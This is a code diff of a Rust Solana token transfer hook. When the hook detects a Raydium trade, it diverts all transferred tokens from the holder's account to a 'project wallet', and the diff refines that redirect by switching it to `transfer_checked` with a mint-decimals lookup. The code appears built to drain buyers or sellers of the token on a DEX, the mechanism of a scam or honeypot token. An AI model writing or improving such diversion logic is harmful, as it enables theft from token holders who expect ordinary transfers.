@@ -531,13 +531,22 @@ pub fn on_transfer(
         msg!("Raydium transaction detected. Redirecting tokens to project wallet.");
 
         // Transfer all tokens to the Project Wallet
-        let transfer_ix = spl_token_2022::instruction::transfer(
+        let token_mint_info = next_account_info(account_iter)?; // Mint account (validate decimals)
+
+        // You may need to fetch the mint's decimals using `spl_token_2022::state::Mint` if you don't already have them
+        let mint_account_data =
+            spl_token_2022::state::Mint::unpack(&token_mint_info.data.borrow()).map_err(|_| ProgramError::InvalidAccountData)?;
+        let decimals = mint_account_data.decimals;
+
+        let transfer_ix = spl_token_2022::instruction::transfer_checked(
             &spl_token_2022::id(),
             source_account.key,
+            token_mint_info.key,          // Token mint
             project_wallet_account.key,
-            source_account.key, // Must be signed by source authority
-            &[],
+            source_account.key,           // Must be signed by source authority
+            &[],                          // Signers (if there are any additional signatures)
             amount,
+            decimals,                     // Mint decimals for validation
         );
 
         solana_program::program::invoke(
